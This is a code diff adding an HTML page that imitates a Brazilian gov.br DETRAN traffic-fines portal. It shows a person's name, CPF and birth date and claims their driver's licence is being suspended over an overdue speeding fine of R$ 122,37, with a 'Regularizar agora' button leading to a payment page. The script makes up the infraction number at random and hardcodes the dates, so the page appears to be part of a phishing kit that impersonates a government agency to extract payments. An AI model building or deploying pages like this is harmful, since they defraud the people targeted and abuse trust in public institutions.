@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regularize-se | DETRAN</title>
+    <link rel="icon" type="image/x-icon" href="../index_files/favicon.ico">
+    <link rel="stylesheet" href="../index_files/index-D3hvFbL-.css">
+    <script src="../vendor/tailwindcss.js"></script>
+</head>
+<body class="bg-gray-50 overflow-x-hidden">
+    <div id="root">
+        <div class="min-h-screen bg-gray-50">
+            <header class="bg-white shadow-sm border-b fixed top-0 left-0 right-0 z-50">
+                <div class="max-w-7xl mx-auto px-3 sm:px-4 h-14 flex items-center justify-between gap-2">
+                    <div class="flex items-center overflow-hidden min-w-0 flex-1">
+                        <a class="flex items-center flex-shrink-0" href="#"><img src="../index_files/govbr-logo-large-CK1AxAnO.png" alt="gov.br" class="h-5 sm:h-6"></a>
+                        <div class="ml-2 pl-2 sm:ml-4 sm:pl-4 border-l border-gray-300 min-w-0 overflow-hidden">
+                            <h1 class="text-[11px] sm:text-sm font-medium text-gray-900 truncate">Sistema de Infrações e Multas</h1>
+                            <p class="hidden sm:block text-xs text-gray-600 truncate">DETRAN - Departamento de Trânsito</p>
+                        </div>
+                    </div>
+                    <div class="flex items-center flex-shrink-0">
+                        <button class="p-1 sm:p-2 text-gray-600 hover:text-gray-900 relative" aria-label="Notificações">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bell w-4 h-4 sm:w-5 sm:h-5">
+                                <path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"></path>
+                                <path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"></path>
+                            </svg>
+                        </button>
+                        <div class="ml-2 sm:ml-4 flex items-center">
+                            <div class="hidden sm:block text-right mr-2 sm:mr-3">
+                                <p id="top-name" class="text-xs sm:text-sm font-medium text-gray-900 whitespace-nowrap overflow-hidden text-ellipsis max-w-[120px] sm:max-w-none"></p>
+                                <p id="top-cpf" class="text-xs text-gray-600 whitespace-nowrap overflow-hidden text-ellipsis max-w-[120px] sm:max-w-none"></p>
+                            </div>
+                            <div id="avatar" class="w-7 h-7 sm:w-9 sm:h-9 rounded-full bg-purple-700 flex items-center justify-center text-white font-medium text-xs sm:text-sm">--</div>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <main class="max-w-3xl mx-auto px-3 sm:px-4 py-4 mt-20 sm:mt-24">
+                <div class="bg-white rounded-lg shadow-sm border overflow-hidden">
+                    <div class="px-3 py-2 border-b border-gray-100 bg-gray-50">
+                        <h1 class="text-sm font-semibold text-gray-900">Confirmação de Dados do Condutor</h1>
+                    </div>
+
+                    <div class="p-3 space-y-2">
+                        <div class="grid grid-cols-2 sm:grid-cols-3 gap-x-4 gap-y-1.5 text-xs sm:text-sm">
+                            <div>
+                                <p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Nome</p>
+                                <p id="nome" class="font-medium text-gray-900 leading-tight">-</p>
+                            </div>
+                            <div>
+                                <p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">CPF</p>
+                                <p id="cpf" class="font-medium text-gray-900">-</p>
+                            </div>
+                            <div>
+                                <p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Data de nascimento</p>
+                                <p id="nascimento" class="font-medium text-gray-900">-</p>
+                            </div>
+                            <div>
+                                <p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Situação da CNH</p>
+                                <p class="font-medium text-amber-700">Em processo de suspensão</p>
+                            </div>
+                            <div>
+                                <p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Nº da infração</p>
+                                <p id="infracao" class="font-medium text-gray-900">-</p>
+                            </div>
+                            <div>
+                                <p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Prazo final</p>
+                                <p id="prazo" class="font-medium text-gray-900">-</p>
+                            </div>
+                        </div>
+
+                        <div class="border border-gray-200 rounded-md overflow-hidden">
+                            <div class="px-3 py-1.5 bg-gray-50 border-b border-gray-200 flex items-center gap-1.5">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-amber-600 flex-shrink-0">
+                                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+                                    <path d="M12 9v4"></path>
+                                    <path d="M12 17h.01"></path>
+                                </svg>
+                                <h2 class="font-semibold text-gray-900 text-xs sm:text-sm">Detalhes da infração</h2>
+                            </div>
+                            <div class="p-2 text-xs sm:text-sm text-gray-600">
+                                <p class="mb-2">Infração <span class="font-medium text-gray-900">gravíssima</span> não contestada no prazo legal.</p>
+                                <dl class="grid grid-cols-2 gap-1.5">
+                                    <div class="bg-gray-50 rounded p-2">
+                                        <dt class="text-[10px] sm:text-xs text-gray-500">Tipo</dt>
+                                        <dd class="font-medium text-gray-900 text-xs sm:text-sm leading-tight">Excesso de velocidade (+50%)</dd>
+                                    </div>
+                                    <div class="bg-gray-50 rounded p-2">
+                                        <dt class="text-[10px] sm:text-xs text-gray-500">Autuação</dt>
+                                        <dd id="autuacao" class="font-medium text-gray-900 text-xs sm:text-sm">-</dd>
+                                    </div>
+                                    <div class="bg-gray-50 rounded p-2">
+                                        <dt class="text-[10px] sm:text-xs text-gray-500">Código</dt>
+                                        <dd class="font-medium text-gray-900 text-xs sm:text-sm leading-tight">5952 — Art. 218</dd>
+                                    </div>
+                                    <div class="bg-gray-50 rounded p-2">
+                                        <dt class="text-[10px] sm:text-xs text-gray-500">Situação</dt>
+                                        <dd class="font-medium text-amber-700 text-xs sm:text-sm">Vencida</dd>
+                                    </div>
+                                </dl>
+                            </div>
+                        </div>
+
+                        <div class="rounded-md border border-blue-100 bg-blue-50 px-3 py-2 flex items-center justify-between gap-2">
+                            <div>
+                                <p class="text-[10px] sm:text-xs text-blue-800 uppercase tracking-wide font-medium">Valor para regularização</p>
+                            </div>
+                            <p class="text-lg sm:text-xl font-bold text-gray-900 whitespace-nowrap">R$ 122,37</p>
+                        </div>
+
+                        <div class="bg-amber-50 border border-amber-200 rounded-md px-3 py-2">
+                            <p class="font-medium text-amber-900 text-xs sm:text-sm mb-1">Consequências do não pagamento</p>
+                            <ul class="text-[11px] sm:text-xs text-amber-900/90 list-disc pl-4 space-y-0.5">
+                                <li id="conseq1">Suspensão da CNH a partir de -</li>
+                                <li>Restrição para renovação da CNH e licenciamento</li>
+                            </ul>
+                        </div>
+
+                        <button id="regularizar-btn" class="w-full h-10 bg-blue-600 text-white font-semibold px-4 rounded-md hover:bg-blue-700 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 text-sm">Regularizar agora</button>
+                    </div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <script>
+        function initials(name) {
+            const parts = (name || '').trim().split(/\s+/).filter(Boolean);
+            if (!parts.length) return '--';
+            if (parts.length === 1) return parts[0].slice(0, 2).toUpperCase();
+            return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
+        }
+
+        function formatCpf(cpf) {
+            const n = (cpf || '').replace(/\D/g, '');
+            return n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+
+        async function loadData() {
+            let payload = null;
+            let meta = null;
+            try {
+                payload = JSON.parse(sessionStorage.getItem('cpf_lookup_payload') || 'null');
+            } catch (e) {
+                payload = null;
+            }
+
+            try {
+                meta = JSON.parse(sessionStorage.getItem('cpf_case_meta') || 'null');
+            } catch (e) {
+                meta = null;
+            }
+
+            if (!payload || !payload.body) {
+                const cpf = sessionStorage.getItem('cpf_lookup_cpf') || '';
+                if (!cpf) {
+                    window.location.replace('home.html');
+                    return;
+                }
+                const res = await fetch(`/api/cpf?cpf=${encodeURIComponent(cpf)}`);
+                payload = await res.json();
+            }
+
+            if (!meta || !meta.ticket) {
+                meta = {
+                    flowId: '',
+                    ticket: `DT${Math.floor(Math.random() * 1000000).toString().padStart(6, '0')}`,
+                    prazoFinal: '-',
+                    vencimento: '-',
+                    dataInfracao: '04/04/2025',
+                    dataAutuacao: '04/04/2026',
+                    docCode: '----------'
+                };
+                sessionStorage.setItem('cpf_case_meta', JSON.stringify(meta));
+            }
+
+            const body = payload.body || {};
+            const nome = body.name || 'Condutor não identificado';
+            const cpfMasked = body.cpf_masked || formatCpf(body.cpf || sessionStorage.getItem('cpf_lookup_cpf') || '');
+            const nascimento = body.birth_date || '-';
+            const prazo = meta.prazoFinal || '-';
+            const infracao = meta.ticket || '-';
+
+            document.querySelector('#nome').textContent = nome;
+            document.querySelector('#cpf').textContent = cpfMasked;
+            document.querySelector('#nascimento').textContent = nascimento;
+            document.querySelector('#prazo').textContent = prazo;
+            document.querySelector('#infracao').textContent = infracao;
+            document.querySelector('#autuacao').textContent = meta.dataAutuacao || '-';
+            document.querySelector('#conseq1').textContent = `Suspensão da CNH a partir de ${prazo}`;
+            document.querySelector('#avatar').textContent = initials(nome);
+            document.querySelector('#top-name').textContent = nome;
+            document.querySelector('#top-cpf').textContent = cpfMasked;
+
+            const regularizarBtn = document.querySelector('#regularizar-btn');
+            regularizarBtn.addEventListener('click', async function () {
+                const id = meta.flowId || '';
+                window.location.href = `pagamento.html?id=${encodeURIComponent(id)}`;
+            });
+        }
+
+        loadData().catch(function () {
+            window.location.replace('home.html');
+        });
+    </script>
+</body>
+</html>
